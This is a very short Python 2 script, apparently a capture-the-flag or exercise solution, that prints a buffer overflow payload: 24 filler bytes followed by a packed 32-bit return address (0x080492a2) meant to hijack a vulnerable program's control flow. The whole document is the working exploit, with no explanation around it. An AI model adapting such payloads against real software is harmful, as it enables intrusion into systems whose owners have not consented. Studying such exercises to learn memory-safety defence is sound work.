import struct

buffer = "A" * 24
faddr = struct.pack("I", 0x080492a2) #'\xa2\x92\x04\x08'
print buffer + faddr
